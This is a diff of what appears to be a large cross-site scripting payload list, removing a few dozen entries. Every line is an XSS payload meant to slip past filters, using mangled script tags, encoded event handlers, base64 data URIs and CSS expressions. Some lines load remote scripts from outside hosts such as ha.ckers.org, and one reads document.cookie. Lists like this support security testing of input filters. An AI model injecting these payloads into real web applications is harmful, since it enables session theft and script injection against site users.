@@ -6393,7 +6393,6 @@ javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 <<scr\0ipt/src=http://xss.com/xss.js></script
 
-'';!--"<XSS>=&{()}
 '';!--"<script>alert(0);</script>=&{()}
 '';!--"<script>alert(0);</script>=&{(alert(1))}
 `><script>alert(0)</script>
@@ -6737,8 +6736,6 @@ http://www.<script>alert(1)</script .com
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
 <SCRIPT SRC=//ha.ckers.org/.j>
-<SCRIPT>a=/XSS/
-alert(a.source)</SCRIPT>
 <SCRIPT>alert('XSS');</SCRIPT>
 <SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
 
@@ -10471,26 +10468,6 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <x onmouseup=alert(1)>click this!
 <x contenteditable onpaste=alert(1)>paste here!
 <x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>
-<x %6Fnxxx=1
-<x o%6Exxx=1
-<x on%78xx=1
-<x onxxx%3D1
-<X onxxx=1
-<x OnXxx=1
-<X OnXxx=1
-<x onxxx=1 onxxx=1
-<x/onxxx=1
-<x%09onxxx=1
-<x%0Aonxxx=1
-<x%0Conxxx=1
-<x%0Donxxx=1
-<x%2Fonxxx=1
-<x 1='1'onxxx=1
-<x 1="1"onxxx=1
-<x </onxxx=1
-<x 1=">" onxxx=1
-<http://onxxx%3D1/
-<x onxxx=alert(1) 1='
 <x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
 X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <x style="behavior:url(%(sct)s)">
@@ -10587,8 +10564,6 @@ X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
 <xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
 <XSS STYLE="behavior: url(%(htc)s);">
 <XSS STYLE="xss:expression(javascript:alert(1))">
-'';!--"<XSS>=&{()}
-\";alert('XSS');//
 xss"><!--><svg/onload=alert(document.domain)>
 <XSS STYLE="xss:expression(alert('XSS'))">
 <XSS STYLE="behavior: url(xss.htc);">
@@ -10596,12 +10571,6 @@ xss"><!--><svg/onload=alert(document.domain)>
 http://www.<script>alert(1)</script .com
 import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
 @i\6d\70o\72\74'javascr\ipt:alert(document.cookie)';
-alert(String(/xss/).substr(1,3))
-alert(/xss/.source)
-“><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome
-%3Cx onxxx=alert(1)
-<%78 onxxx=1
-<details/open/ontoggle="alert`1`">
 data:text/html,<script>alert(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
 " onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
